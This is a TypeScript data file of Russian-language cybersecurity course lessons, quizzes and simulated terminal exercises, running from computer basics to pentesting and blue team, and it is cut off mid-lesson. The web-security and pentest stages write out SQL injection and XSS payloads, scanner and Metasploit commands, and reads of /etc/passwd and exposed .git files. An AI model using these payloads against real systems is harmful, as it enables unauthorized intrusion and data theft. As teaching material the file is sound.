import { Stage } from '../types';

export const STAGES: Stage[] = [
  {
    id: 'it-zero', order: 0,
    title: 'Как устроен компьютер',
    subtitle: 'Абсолютный старт',
    icon: '🖥️', color: '#6366f1',
    difficulty: 'zero', xpReward: 150,
    description: 'Узнай как работают компьютеры, процессоры и память — фундамент всего IT.',
    skills: ['Архитектура ПК', 'Операционные системы', 'Файловые системы'],
    lessons: [
      {
        id: 'it-zero-l1', title: 'Что внутри компьютера?', duration: 8, type: 'theory',
        content: `# Что внутри компьютера?

Компьютер — это машина, которая выполняет инструкции.

## Процессор (CPU)

**CPU** — «мозг» компьютера. Выполняет все вычисления.

\`\`\`
Intel Core i7 = ~4 000 000 000 операций/сек
\`\`\`

CPU делает:
- Читает инструкции из памяти
- Выполняет математические операции
- Принимает решения (если A > B, то...)

## Оперативная память (RAM)

**RAM** — быстрая временная память для текущих задач.

> Аналогия: RAM — это стол, где ты работаешь. Диск — шкаф для хранения.

\`\`\`
Открыл браузер → данные в RAM
Выключил ПК → RAM очистилась
\`\`\`

## Хранилище (SSD/HDD)

Постоянная память — данные сохраняются после выключения.

| | SSD | HDD |
|--|-----|-----|
| Скорость | 500-7000 МБ/с | 80-160 МБ/с |
| Надёжность | Высокая | Средняя |

## Почему это важно для безопасности?

- Вирусы **живут** в RAM и **хранятся** на диске
- Форензика исследует данные с диска
- Шифрование защищает данные на диске
- Атаки холодной загрузки — кража данных из RAM`,
      },
      {
        id: 'it-zero-l2', title: 'Операционная система', duration: 10, type: 'theory',
        content: `# Операционная система (ОС)

ОС управляет железом и запускает программы.

## Что делает ОС?

\`\`\`
Ты нажимаешь «A» на клавиатуре
        ↓
Сигнал от клавиатуры
        ↓
Ядро ОС перехватывает (прерывание)
        ↓
Передаёт символ активному приложению
        ↓
Текстовый редактор показывает «A»
\`\`\`

## Популярные ОС

### Linux 🐧
- 96% серверов в интернете
- Бесплатная и открытая
- Основа Android, Kali Linux

### Windows 🪟
- 72% настольных ПК
- Корпоративный стандарт

### macOS 🍎
- Основана на Unix (как Linux)
- Только на Apple устройствах

## Ядро (Kernel)

Управляет памятью, процессами, файлами и сетью.

## Права и безопасность

\`\`\`
root/Administrator  → полный доступ
Обычный пользователь → ограничен
Гость → минимальные права
\`\`\`

> Принцип минимальных привилегий: давай ровно столько прав, сколько нужно.`,
      },
      {
        id: 'it-zero-quiz', title: 'Тест: Основы компьютера', duration: 5, type: 'quiz',
        quiz: [
          { id: 'q1', question: 'Что происходит с данными в RAM при выключении компьютера?', options: ['Сохраняются на диск', 'Стираются', 'Перемещаются в облако', 'Остаются в CPU'], correctIndex: 1, explanation: 'RAM — энергозависимая память. При отключении питания все данные уничтожаются. Именно поэтому важно сохранять файлы на диск.' },
          { id: 'q2', question: 'Где хранятся вирусы МЕЖДУ перезагрузками?', options: ['RAM', 'CPU кэш', 'SSD/HDD', 'Видеокарта'], correctIndex: 2, explanation: 'Вирусы сохраняются на постоянном хранилище (SSD/HDD), чтобы выжить после перезагрузки. Во время работы они загружаются в RAM.' },
          { id: 'q3', question: 'Что такое принцип минимальных привилегий?', options: ['Давать максимум прав', 'Давать ровно столько прав, сколько нужно', 'Запрещать все права', 'Права только для администраторов'], correctIndex: 1, explanation: 'Принцип минимальных привилегий — основа безопасности. Если программа взломана, при минимальных правах ущерб ограничен.' },
          { id: 'q4', question: 'Какая ОС используется на 96% серверов?', options: ['Windows Server', 'macOS', 'Linux', 'FreeBSD'], correctIndex: 2, explanation: 'Linux доминирует на серверах благодаря надёжности, открытому коду и бесплатности. Поэтому Linux — обязательное знание для специалиста по безопасности.' },
        ],
      },
    ],
  },

  {
    id: 'networks-101', order: 1,
    title: 'Как работает интернет',
    subtitle: 'Сети с нуля',
    icon: '🌐', color: '#06b6d4',
    difficulty: 'beginner', xpReward: 200,
    requiresStage: 'it-zero',
    description: 'Как данные путешествуют по интернету, что такое IP, DNS и порты.',
    skills: ['IP-адреса', 'DNS', 'HTTP/HTTPS', 'TCP/UDP', 'Порты'],
    lessons: [
      {
        id: 'net-l1', title: 'Путь данных в интернете', duration: 10, type: 'theory',
        content: `# Как работает интернет

## Что происходит когда ты открываешь google.com?

\`\`\`
1. Вводишь: google.com
2. DNS переводит в IP: 142.250.185.46
3. Подключаешься к серверу по IP
4. Отправляешь запрос: GET /
5. Сервер присылает HTML страницу
6. Браузер отображает страницу
\`\`\`

Всё это происходит за **< 100 миллисекунд!**

## IP-адрес

Уникальный адрес каждого устройства в сети.

\`\`\`
IPv4: 192.168.1.1
IPv6: 2001:db8::1
\`\`\`

| Тип | Диапазон |
|-----|----------|
| Приватный | 192.168.x.x |
| Приватный | 10.x.x.x |
| Публичный | Всё остальное |

## DNS — телефонная книга интернета

\`\`\`
google.com → 142.250.185.46
youtube.com → 216.58.215.110
\`\`\`

> Атака DNS Spoofing: хакер подменяет ответ DNS — ты идёшь на поддельный сайт!

## Порты — двери в дом

IP — адрес дома, порт — конкретная дверь.

\`\`\`
:443 → HTTPS (шифрованный веб)
:80  → HTTP (нешифрованный)
:22  → SSH (удалённый доступ)
:3306→ MySQL (база данных)
\`\`\`

> Открытый лишний порт = уязвимость. Закрывай всё лишнее!

## HTTP vs HTTPS

\`\`\`
HTTP  → данные видны всем в сети
HTTPS → данные зашифрованы (TLS)
\`\`\`

Всегда проверяй 🔒 перед вводом пароля!`,
      },
      {
        id: 'net-term', title: 'Практика: сетевые команды', duration: 15, type: 'terminal',
        terminal: {
          intro: 'Изучаем базовые сетевые команды — их знает каждый IT-специалист и хакер.',
          goal: 'Выполни все 5 сетевых команд',
          steps: [
            { cmd: 'ping google.com', output: 'PING google.com (142.250.185.46)\n64 bytes: icmp_seq=1 time=12.4 ms\n64 bytes: icmp_seq=2 time=11.8 ms\n64 bytes: icmp_seq=3 time=12.1 ms\n3 packets transmitted, 0% packet loss', hint: 'ping проверяет доступность хоста и скорость соединения (RTT).' },
            { cmd: 'nslookup google.com', output: 'Server: 8.8.8.8 (Google DNS)\n\nName:    google.com\nAddress: 142.250.185.46', hint: 'nslookup запрашивает DNS сервер. Порт 53 — стандартный порт DNS.' },
            { cmd: 'netstat -tulpn', output: 'Proto  Local Address     State\ntcp    0.0.0.0:22        LISTEN  (sshd)\ntcp    0.0.0.0:80        LISTEN  (nginx)\ntcp    0.0.0.0:443       LISTEN  (nginx)\ntcp    127.0.0.1:3306    LISTEN  (mysqld)', hint: 'MySQL на 127.0.0.1 — правильно (только локально). Если бы был 0.0.0.0:3306 — критическая уязвимость!' },
            { cmd: 'traceroute google.com', output: ' 1  192.168.1.1 (роутер) 1.2 ms\n 2  10.0.0.1 (провайдер) 8.4 ms\n 3  213.180.193.1 (магистраль) 11.2 ms\n 4  142.250.185.46 (google.com) 12.4 ms', hint: 'traceroute показывает путь пакета. Каждая строка — маршрутизатор на пути.' },
            { cmd: 'curl -I https://google.com', output: 'HTTP/2 301\nlocation: https://www.google.com/\nserver: gws\nx-xss-protection: 0\nx-frame-options: SAMEORIGIN', hint: 'curl -I показывает HTTP заголовки. "server: gws" раскрывает тип сервера Google.' },
          ],
        },
      },
      {
        id: 'net-quiz', title: 'Тест: Сети', duration: 6, type: 'quiz',
        quiz: [
          { id: 'nq1', question: 'Что делает DNS?', options: ['Шифрует трафик', 'Переводит домены в IP-адреса', 'Назначает IP устройствам', 'Фильтрует трафик'], correctIndex: 1, explanation: 'DNS переводит понятные людям имена (google.com) в IP-адреса (142.250.185.46), которые понимают компьютеры.' },
          { id: 'nq2', question: 'На каком порту работает HTTPS?', options: ['80', '22', '443', '3306'], correctIndex: 2, explanation: 'HTTPS — порт 443. HTTP — 80. SSH — 22. MySQL — 3306. Знание портов критично для пентеста и администрирования.' },
          { id: 'nq3', question: 'Чем опасен открытый порт 3306 в интернете?', options: ['Замедляет сайт', 'Прямой доступ к базе данных из интернета', 'Блокирует HTTPS', 'Ничем'], correctIndex: 1, explanation: 'Порт 3306 (MySQL) должен быть доступен только локально (127.0.0.1). Открытый в интернет — прямая атака на базу данных с паролями пользователей.' },
          { id: 'nq4', question: 'Что такое SYN-флуд?', options: ['Взлом пароля', 'DDoS через тысячи незавершённых TCP-соединений', 'Подмена DNS', 'SQL-инъекция'], correctIndex: 1, explanation: 'SYN-флуд исчерпывает ресурсы сервера незавершёнными соединениями. Сервер падает — это атака на Доступность (A в CIA-триаде).' },
        ],
      },
    ],
  },

  {
    id: 'linux-basics', order: 2,
    title: 'Linux с нуля',
    subtitle: 'Командная строка',
    icon: '🐧', color: '#22c55e',
    difficulty: 'beginner', xpReward: 250,
    requiresStage: 'networks-101',
    description: 'Linux — основа всего IT. 96% серверов, Kali Linux, Android — всё это Linux.',
    skills: ['Файловая система', 'Базовые команды', 'Права доступа', 'Пользователи'],
    lessons: [
      {
        id: 'linux-l1', title: 'Почему Linux и терминал', duration: 8, type: 'theory',
        content: `# Linux и командная строка

## Зачем учить Linux?

\`\`\`
96% серверов в интернете → Linux
Kali Linux (инструмент хакера) → Linux
Android → основан на Linux
Все облачные серверы → Linux
\`\`\`

Без Linux нельзя работать в безопасности.

## Файловая система Linux

\`\`\`
/                   ← корень системы
├── /home/user/     ← твои файлы
├── /etc/           ← конфиги системы
├── /var/log/       ← логи событий
├── /tmp/           ← временные файлы
├── /bin/           ← системные программы
├── /etc/passwd     ← список пользователей
└── /etc/shadow     ← хэши паролей (только root!)
\`\`\`

> В Linux ВСЁ — файл. Диски, сеть, устройства — представлены как файлы.

## Права доступа

\`\`\`
ls -la secret.txt
-rw-r--r-- 1 alice users secret.txt
 │└┬┘└┬┘└┬┘
 │ │  │  └── Все: r (читать)
 │ │  └───── Группа: r
 │ └──────── Владелец: rw (читать+писать)
 └────────── Тип: - файл, d папка
\`\`\`

Числовые права:
\`\`\`
r=4  w=2  x=1

chmod 755 = rwxr-xr-x
chmod 600 = rw------- (SSH ключи!)
chmod 777 = rwxrwxrwx (ОПАСНО!)
\`\`\``,
      },
      {
        id: 'linux-term', title: 'Практика: работа в терминале', duration: 20, type: 'terminal',
        terminal: {
          intro: 'Первый реальный терминальный урок. Выполняй команды и изучай вывод.',
          goal: 'Освой 6 базовых команд Linux',
          steps: [
            { cmd: 'pwd', output: '/home/student', hint: 'pwd — где ты сейчас находишься. Всегда начинай с этого для ориентации.' },
            { cmd: 'ls -la', output: 'drwxr-xr-x  student\n-rw-r--r--  readme.txt\n-rw-------  secret.key\ndrwxr-xr-x  documents', hint: 'ls -la показывает ВСЕ файлы с правами. secret.key имеет права 600 — только владелец читает.' },
            { cmd: 'cat /etc/passwd', output: 'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:/var/www:/usr/sbin/nologin\nstudent:x:1000:1000:/home/student:/bin/bash\n# "x" = пароль в /etc/shadow', hint: '/etc/passwd — список пользователей. UID 0 = root. Пароли перенесены в /etc/shadow (доступен только root).' },
            { cmd: 'id', output: 'uid=1000(student) gid=1000(student) groups=1000(student),27(sudo)', hint: 'id показывает твой ID. Видишь "sudo"? Можешь выполнять команды с правами администратора.' },
            { cmd: 'ps aux', output: 'USER     PID  COMMAND\nroot       1  /sbin/init\nroot     234  /usr/sbin/sshd\nwww-data 891  /usr/sbin/nginx\nstudent 1234  bash\nmysql    567  /usr/sbin/mysqld', hint: 'ps aux показывает все процессы. Хакеры прячут вредоносные процессы — нужно уметь их находить.' },
            { cmd: 'find / -perm -4000 2>/dev/null', output: '/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/su\n# SUID файлы — выполняются с правами владельца!', hint: 'SUID файлы запускаются с правами владельца (часто root). Если уязвимы — вектор privilege escalation!' },
          ],
        },
      },
      {
        id: 'linux-quiz', title: 'Тест: Linux', duration: 5, type: 'quiz',
        quiz: [
          { id: 'lq1', question: 'Где хранятся хэши паролей в Linux?', options: ['/etc/passwd', '/etc/shadow', '/home/passwords', '/var/log/auth.log'], correctIndex: 1, explanation: '/etc/shadow содержит хэши паролей и доступен только root. /etc/passwd — только метаданные пользователей, доступен всем.' },
          { id: 'lq2', question: 'Что означает chmod 600?', options: ['Все читают и пишут', 'Только владелец читает и пишет', 'Все читают', 'Владелец запускает'], correctIndex: 1, explanation: '600 = rw------- — только владелец. Идеально для SSH ключей. SSH откажет в соединении если права не 600!' },
          { id: 'lq3', question: 'Чем опасен SUID бит?', options: ['Замедляет файл', 'Файл выполняется с правами владельца (часто root)', 'Делает файл невидимым', 'Блокирует запись'], correctIndex: 1, explanation: 'SUID позволяет выполнять файл с правами его владельца. Если SUID-файл принадлежит root и уязвим — злоумышленник получает root доступ.' },
        ],
      },
    ],
  },

  {
    id: 'security-101', order: 3,
    title: 'Кибербезопасность 101',
    subtitle: 'Что защищаем и от кого',
    icon: '🛡️', color: '#f59e0b',
    difficulty: 'beginner', xpReward: 300,
    requiresStage: 'linux-basics',
    description: 'CIA-триада, типы угроз, социальная инженерия — основы информационной безопасности.',
    skills: ['CIA-триада', 'Типы угроз', 'Социальная инженерия', 'Фишинг', 'MFA'],
    lessons: [
      {
        id: 'sec-l1', title: 'CIA-триада', duration: 10, type: 'theory',
        content: `# Основы информационной безопасности

## CIA-триада — фундамент ИБ

\`\`\`
Confidentiality  → Конфиденциальность
Integrity        → Целостность
Availability     → Доступность
\`\`\`

### 🔐 Конфиденциальность
Данные видят только те, кто имеет право.

\`\`\`
Нарушение: хакер прочитал переписку
Защита: шифрование (AES, TLS, E2E)
\`\`\`

### ✅ Целостность
Данные не изменены без разрешения.

\`\`\`
Нарушение: хакер изменил сумму перевода
Защита: цифровые подписи, хэши SHA-256
\`\`\`

### ⚡ Доступность
Сервис работает когда нужен.

\`\`\`
Нарушение: DDoS-атака положила сайт банка
Защита: резервирование, CDN, WAF
\`\`\`

## Типы злоумышленников

| Тип | Мотивация |
|-----|-----------|
| Script Kiddie | Веселье |
| Хактивист | Идеология |
| Киберпреступник | Деньги |
| APT (государство) | Шпионаж |
| Инсайдер | Месть/деньги |

## Поверхность атаки

\`\`\`
Физическая: USB, серверная, принтеры
Цифровая:   открытые порты, API, веб
Социальная: сотрудники (фишинг, звонки)
\`\`\`

> Уменьшай поверхность атаки. Закрывай всё лишнее.`,
      },
      {
        id: 'sec-l2', title: 'Социальная инженерия', duration: 12, type: 'theory',
        content: `# Социальная инженерия

**93% взломов начинаются с человека.**

## Виды атак

### 🎣 Фишинг
\`\`\`
От: support@sberbenk.ru  ← не sberbank!
Тема: Аккаунт заблокирован!

Войдите: http://sberbenk.ru/login
\`\`\`

### 🎯 Спир-фишинг (целевой)
\`\`\`
Хакер изучил LinkedIn → знает имя CEO
Письмо бухгалтеру "от CEO":
"Срочно переведи 500 000 ₽.
Конфиденциально!"
\`\`\`

### 📞 Вишинг (по телефону)
\`\`\`
"Служба безопасности Сбербанка.
Ваша карта заблокирована.
Назовите код из SMS..."
\`\`\`

## 6 психологических триггеров

\`\`\`
Срочность:   "Осталось 5 минут!"
Страх:       "Аккаунт взломан!"
Авторитет:   "Это ФСБ говорит"
Жадность:    "Вы выиграли!"
Дефицит:     "Последнее место!"
Доверие:     Имитирует коллег
\`\`\`

## Защита

\`\`\`
✓ Проверяй домен (не название, а адрес)
✓ Не вводи пароль по ссылке из письма
✓ Перезванивай по официальному номеру
✓ 2FA/MFA защитит даже при утечке пароля
✓ Пауза и думай — срочность создана намеренно
\`\`\``,
      },
      {
        id: 'sec-quiz', title: 'Тест: Основы ИБ', duration: 7, type: 'quiz',
        quiz: [
          { id: 'sq1', question: 'DDoS-атака нарушает какой принцип CIA?', options: ['Конфиденциальность', 'Целостность', 'Доступность', 'Все три'], correctIndex: 2, explanation: 'DDoS (Distributed Denial of Service) атакует Доступность — сервис перегружается и становится недоступен для легитимных пользователей.' },
          { id: 'sq2', question: 'Ты получил письмо от "CEO" с просьбой срочно перевести деньги. Что делать?', options: ['Немедленно выполнить', 'Ответить на письмо', 'Позвонить CEO по известному номеру', 'Переслать в бухгалтерию'], correctIndex: 2, explanation: 'BEC (Business Email Compromise) — атака. Всегда верифицируй финансовые запросы по независимому каналу. Звонок по известному номеру — не по тому, что в письме.' },
          { id: 'sq3', question: 'Хэш файла изменился. Что это означает?', options: ['Файл просмотрели', 'Файл скопировали', 'Файл изменили', 'Файл зашифровали'], correctIndex: 2, explanation: 'Хэш — уникальный отпечаток файла. Любое изменение даёт другой хэш. Так обнаруживают вирусы и несанкционированные изменения.' },
          { id: 'sq4', question: 'Зачем нужна 2FA при фишинге?', options: ['Делает пароль длиннее', 'Шифрует трафик', 'Второй фактор защитит даже при украденном пароле', 'Блокирует фишинговые сайты'], correctIndex: 2, explanation: 'MFA требует второй фактор (приложение-аутентификатор). Даже зная пароль, злоумышленник не войдёт без физического доступа к твоему телефону.' },
        ],
      },
    ],
  },

  {
    id: 'web-security', order: 4,
    title: 'Веб-безопасность',
    subtitle: 'OWASP Top 10',
    icon: '🔓', color: '#ef4444',
    difficulty: 'intermediate', xpReward: 400,
    requiresStage: 'security-101',
    description: 'SQL-инъекции, XSS, CSRF — атаки на веб-приложения и способы защиты.',
    skills: ['SQL Injection', 'XSS', 'CSRF', 'Burp Suite', 'OWASP Top 10'],
    lessons: [
      {
        id: 'web-l1', title: 'SQL-инъекции', duration: 15, type: 'theory',
        content: `# SQL-инъекции

## Как это работает?

Уязвимый код:
\`\`\`python
# ОПАСНО!
query = "SELECT * FROM users WHERE " +
        "username = '" + username + "'"
db.execute(query)
\`\`\`

Нормальный ввод: alice
\`\`\`sql
WHERE username = 'alice'
\`\`\`

Вредоносный ввод: ' OR '1'='1
\`\`\`sql
WHERE username = '' OR '1'='1'
-- '1'='1' всегда истинно → обход авторизации!
\`\`\`

## Что можно сделать

\`\`\`sql
-- Обход авторизации
' OR '1'='1

-- Получить все данные
' UNION SELECT * FROM users--

-- Читать файлы сервера
' UNION SELECT LOAD_FILE('/etc/passwd')--

-- Удалить таблицу
'; DROP TABLE users;--
\`\`\`

## Защита

\`\`\`python
# БЕЗОПАСНО — параметризованные запросы
cursor.execute(
  "SELECT * FROM users WHERE username = ?",
  (username,)
)

# Или ORM:
User.objects.filter(username=username)
\`\`\`

> Инструмент: **sqlmap** — автоматически находит SQL-инъекции`,
      },
      {
        id: 'web-term', title: 'Практика: поиск уязвимостей', duration: 20, type: 'terminal',
        terminal: {
          intro: 'Симулируем поиск веб-уязвимостей. Это легальный аудит безопасности.',
          goal: 'Найди уязвимости в учебном веб-приложении',
          steps: [
            { cmd: "curl \"http://lab.local/login?user=admin'--\"", output: '{"status":"logged_in","user":"admin","role":"administrator"}\n# Обошли авторизацию через SQL-инъекцию!', hint: "Символ ' закрыл строку, -- закомментировал проверку пароля. Один символ = полный доступ!" },
            { cmd: 'nikto -h http://lab.local', output: '+ Server: Apache/2.4.41 Ubuntu\n+ /admin/: Admin login page found!\n+ /config/: Directory indexing enabled\n+ /phpinfo.php: phpinfo() disclosed!\n+ X-Frame-Options: not present (Clickjacking risk)', hint: 'nikto сканирует веб-уязвимости. phpinfo.php раскрывает конфигурацию сервера хакерам.' },
            { cmd: 'sqlmap -u "http://lab.local/users?id=1" --dbs', output: '[+] GET parameter "id" is VULNERABLE!\n[+] Databases:\n    * information_schema\n    * webapp_db\n    * users_data', hint: 'sqlmap нашёл SQL-инъекцию и перечислил все базы данных. Видишь users_data? Там пароли.' },
            { cmd: "curl -X POST http://lab.local/comment -d 'text=<script>alert(1)</script>'", output: '{"status":"ok","comment":"<script>alert(1)</script>"}\n# XSS сохранён без экранирования!\n# Каждый читатель запустит этот скрипт', hint: 'Stored XSS: сервер сохранил скрипт в БД. Правильный ответ был бы &lt;script&gt; (экранирование HTML).' },
            { cmd: 'gobuster dir -u http://lab.local -w common.txt', output: '/admin   → 200 OK\n/.git    → 200 OK  ← критично!\n/backup  → 200 OK  ← опасно!\n/config  → 403', hint: 'Открытый /.git — можно скачать весь исходный код с паролями в истории коммитов!' },
          ],
        },
      },
      {
        id: 'web-quiz', title: 'Тест: Веб-безопасность', duration: 7, type: 'quiz',
        quiz: [
          { id: 'wq1', question: "Что произойдёт при вводе ' OR '1'='1 в уязвимую форму входа?", options: ['XSS-атака', 'Обход авторизации через SQL-инъекцию', 'DDoS сервера', 'Ничего'], correctIndex: 1, explanation: "Это классическая SQL-инъекция. WHERE username='' OR '1'='1' — условие всегда истинно, вход без пароля." },
          { id: 'wq2', question: 'Чем Stored XSS опаснее Reflected XSS?', options: ['Работает только на Linux', 'Хранится в БД и атакует каждого посетителя', 'Сложнее написать', 'Использует SQL'], correctIndex: 1, explanation: 'Stored XSS сохраняется в базе данных. Каждый пользователь, открывший страницу, становится жертвой автоматически.' },
          { id: 'wq3', question: 'Что такое параметризованные запросы?', options: ['Быстрые запросы', 'Метод защиты от SQL-инъекций', 'Сжатие данных', 'Кэширование'], correctIndex: 1, explanation: 'Параметризованные запросы разделяют SQL-код и данные, не позволяя пользовательскому вводу изменить структуру запроса.' },
        ],
      },
    ],
  },

  {
    id: 'cryptography', order: 5,
    title: 'Криптография',
    subtitle: 'Шифрование и хэши',
    icon: '🔑', color: '#a855f7',
    difficulty: 'intermediate', xpReward: 350,
    requiresStage: 'security-101',
    description: 'AES, RSA, хэши, TLS — математика на страже конфиденциальности.',
    skills: ['AES/RSA', 'Хэш-функции', 'TLS/HTTPS', 'PKI', 'Bcrypt'],
    lessons: [
      {
        id: 'crypto-l1', title: 'Симметричное и асимметричное', duration: 14, type: 'theory',
        content: `# Криптография

## Зачем нужно шифрование?

\`\`\`
Без шифрования:
Алиса → "Пароль: secret123" → все видят

С шифрованием:
Алиса → "K3$#mX9@!" → только Боб расшифрует
\`\`\`

## Симметричное шифрование

Один ключ шифрует и расшифровывает.

\`\`\`
"Привет!" + Ключ K → "X7#@k!"
"X7#@k!" + Ключ K → "Привет!"
\`\`\`

**AES-256** — современный стандарт. Очень быстрый.

Проблема: как безопасно передать ключ?

## Асимметричное шифрование

Два ключа: публичный (все знают) + приватный (только ты).

\`\`\`
Боб публикует публичный ключ 🔓
Алиса шифрует им письмо
Только Боб расшифровывает приватным 🔐
\`\`\`

**RSA, ECDSA, Ed25519** — алгоритмы.

В 1000 раз медленнее симметричного.

## Как работает HTTPS (TLS)?

\`\`\`
1. Браузер → Сервер: "Хочу HTTPS"
2. Сервер → Браузер: сертификат (публичный ключ)
3. Браузер проверяет сертификат у CA
4. Браузер генерирует сессионный ключ AES
5. Шифрует его публичным ключом сервера
6. Оба знают AES ключ → быстрое шифрование
\`\`\`

## Хэш-функции

Данные → хэш. Обратно нельзя.

\`\`\`
SHA-256("password") = "5e884898..."
SHA-256("Password") = "0b14d501..."
# 1 буква → полностью другой хэш!
\`\`\`

Хранение паролей:
\`\`\`python
# ПЛОХО: MD5 — взломают за секунды
stored = md5("password123")

# ХОРОШО: bcrypt с солью
import bcrypt
hashed = bcrypt.hashpw(password, bcrypt.gensalt(12))
\`\`\``,
      },
      {
        id: 'crypto-quiz', title: 'Тест: Криптография', duration: 6, type: 'quiz',
        quiz: [
          { id: 'cq1', question: 'Почему нельзя хранить пароли в MD5?', options: ['MD5 слишком медленный', 'MD5 можно расшифровать', 'MD5 быстрый — перебирают млрд/сек + радужные таблицы', 'MD5 не поддерживается'], correctIndex: 2, explanation: 'GPU перебирает 10 млрд MD5/сек. Радужные таблицы хранят хэши миллиардов паролей. Используй bcrypt/Argon2 — они намеренно медленные.' },
          { id: 'cq2', question: 'Для чего HTTPS использует асимметричное шифрование?', options: ['Для шифрования всего трафика', 'Только для обмена сессионным ключом AES', 'Для проверки пароля', 'Для блокировки вирусов'], correctIndex: 1, explanation: 'TLS handshake использует RSA/ECDH для безопасного обмена ключом AES. Затем весь трафик шифруется быстрым AES — гибридное шифрование.' },
          { id: 'cq3', question: 'Что такое "соль" в хранении паролей?', options: ['Второй пароль', 'Случайные данные добавляемые к паролю перед хэшированием', 'Алгоритм шифрования', 'Секретный ключ'], correctIndex: 1, explanation: 'Соль делает хэши уникальными для каждого пользователя. Два одинаковых пароля дают разные хэши. Радужные таблицы становятся бесполезны.' },
        ],
      },
    ],
  },

  {
    id: 'pentest-basics', order: 6,
    title: 'Этичный хакинг',
    subtitle: 'Методология пентеста',
    icon: '⚔️', color: '#f97316',
    difficulty: 'advanced', xpReward: 500,
    requiresStage: 'web-security',
    description: 'OSINT, сканирование, эксплуатация, постэксплуатация — как думает хакер.',
    skills: ['OSINT', 'Nmap', 'Metasploit', 'Burp Suite', 'Privilege Escalation'],
    lessons: [
      {
        id: 'pt-l1', title: 'Методология пентеста', duration: 15, type: 'theory',
        content: `# Этичный хакинг

## Что такое пентест?

Legальная имитация атаки для поиска уязвимостей ДО злоумышленника.

\`\`\`
Black Box  → хакер без знания системы (реалистично)
Grey Box   → частичная информация
White Box  → полный доступ к коду (глубокий аудит)
\`\`\`

## 5 фаз (PTES)

### 1. 📋 Разведка (OSINT)
\`\`\`
Пассивная (жертва не знает):
- Google: site:company.ru filetype:pdf
- LinkedIn: сотрудники, технологии
- Shodan: открытые порты компании
- WHOIS: контакты администратора

Активная:
- nmap сканирование
- DNS перебор поддоменов
\`\`\`

### 2. 🔍 Сканирование
\`\`\`bash
nmap -sV -sC -p- target.com
gobuster dir -u http://target.com -w list.txt
nikto -h target.com
\`\`\`

### 3. ⚔️ Эксплуатация
\`\`\`bash
# Metasploit
use exploit/windows/smb/ms17_010
set RHOSTS 192.168.1.10
run → shell!
\`\`\`

### 4. 🏠 Постэксплуатация
\`\`\`bash
sudo -l           # что можем через sudo?
find / -perm -4000 # SUID файлы
\`\`\`

### 5. 📄 Отчёт
- Уязвимости с CVSS критичностью
- Proof of Concept
- Рекомендации по исправлению

## Легальность!

\`\`\`
✓ ВСЕГДА получай письменное разрешение
✓ Документируй каждый шаг
✗ Атака без разрешения = уголовное преступление
\`\`\`

## Карьера: Red Team

Сертификации: eJPT → CEH → OSCP → CRTO`,
      },
      {
        id: 'pt-term', title: 'Практика: разведка цели', duration: 25, type: 'terminal',
        terminal: {
          intro: 'Симулируем первые фазы пентеста — разведку и сканирование учебной цели.',
          goal: 'Проведи полную разведку и составь карту атаки',
          steps: [
            { cmd: 'whois target-corp.ru', output: 'Domain: target-corp.ru\nRegistrar: REG.RU\nAdmin: admin@target-corp.ru\nName Servers: ns1.target-corp.ru (195.123.1.1)', hint: 'WHOIS даёт контакты (цель для фишинга) и DNS. Пассивная разведка — цель не знает о нас.' },
            { cmd: 'nmap -sV -sC -p 1-1000 195.123.1.1', output: 'PORT    STATE  SERVICE   VERSION\n22/tcp  open   ssh       OpenSSH 7.4\n80/tcp  open   http      Apache 2.4.6\n8080/tcp open  http      Tomcat 9.0.12\n3306/tcp open  mysql     MySQL 5.6.45', hint: 'Tomcat 9.0.12 — есть CVE! MySQL торчит наружу (порт 3306) — критическая ошибка конфига!' },
            { cmd: 'gobuster dir -u http://195.123.1.1 -w common.txt', output: '/admin  → 200 OK\n/backup → 200 OK  ← !\n/.git   → 200 OK  ← критично!\n/uploads→ 200 OK', hint: 'Нашли /.git! Там исходный код с паролями и историей коммитов.' },
            { cmd: 'curl http://195.123.1.1/.git/config', output: '[remote "origin"]\n  url = https://github.com/target-corp/webapp.git\n  fetch = +refs/heads/*:refs/remotes/origin/*', hint: 'В .git/config — приватный репозиторий. Можно скачать весь код с API ключами и паролями!' },
            { cmd: 'searchsploit apache tomcat 9.0', output: 'Tomcat 9.0.x < 9.0.31 - Ghostcat RCE | CVE-2020-1938\nTomcat 9.0.0 < 9.0.17 - Info Disclosure | CVE-2019-0221', hint: 'Ghostcat (CVE-2020-1938) — читает файлы и выполняет код на Tomcat 9.0.12. Это наш вектор атаки!' },
          ],
        },
      },
      {
        id: 'pt-quiz', title: 'Тест: Этичный хакинг', duration: 6, type: 'quiz',
        quiz: [
          { id: 'ptq1', question: 'Чем Black Box отличается от White Box?', options: ['Black box дороже', 'Black box без знания системы, White box с полным доступом к коду', 'Только для разных ОС', 'Одно и то же'], correctIndex: 1, explanation: 'Black box — реалистичная имитация внешнего хакера. White box — полный доступ к коду, находит максимум уязвимостей.' },
          { id: 'ptq2', question: 'Открытый /.git на веб-сервере — это:', options: ['Нормально', 'Критическая уязвимость — весь код с секретами', 'Замедляет сайт', 'Признак защиты'], correctIndex: 1, explanation: 'Открытый /.git позволяет скачать исходный код с историей. Там регулярно находят пароли к БД, API ключи, секреты.' },
          { id: 'ptq3', question: 'Что ОБЯЗАТЕЛЬНО нужно до пентеста?', options: ['Kali Linux', 'Подписка Shodan', 'Письменное разрешение владельца системы', 'Аккаунт HackerOne'], correctIndex: 2, explanation: 'Без письменного разрешения пентест = уголовное преступление. Scope of work защищает обе стороны.' },
        ],
      },
    ],
  },

  {
    id: 'blue-team', order: 7,
    title: 'Blue Team: защита',
    subtitle: 'SIEM и реагирование',
    icon: '🛡️', color: '#3b82f6',
    difficulty: 'advanced', xpReward: 500,
    requiresStage: 'cryptography',
    description: 'SIEM, анализ логов, Incident Response, MITRE ATT&CK — ты на стороне защиты.',
    skills: ['SIEM', 'Анализ логов', 'Incident Response', 'MITRE ATT&CK', 'Threat Hunting'],
    lessons: [
      {
        id: 'bt-l1', title: 'SIEM и мониторинг', duration: 15, type: 'theory',
        content: `# Blue Team: защита

## SIEM — центр безопасности

SIEM собирает логи и ищет аномалии:

\`\`\`
Firewall + Серверы + Антивирус + EDR
                 ↓
              SIEM
                 ↓
"3 неудачных входа + успешный с нового IP
= подозрительно! → Алерт!"
\`\`\`

Популярные: **Splunk**, **Elastic/ELK**, **Wazuh** (OpenSource)

## Что искать в логах

### Windows Event Log:
\`\`\`
4624 → Успешный вход
4625 → Неудачный вход (много = brute force!)
4720 → Создан новый пользователь
4728 → Добавление в привилегированную группу
7045 → Установка нового сервиса (малварь!)
\`\`\`

### Linux логи:
\`\`\`bash
/var/log/auth.log   # SSH, sudo, входы
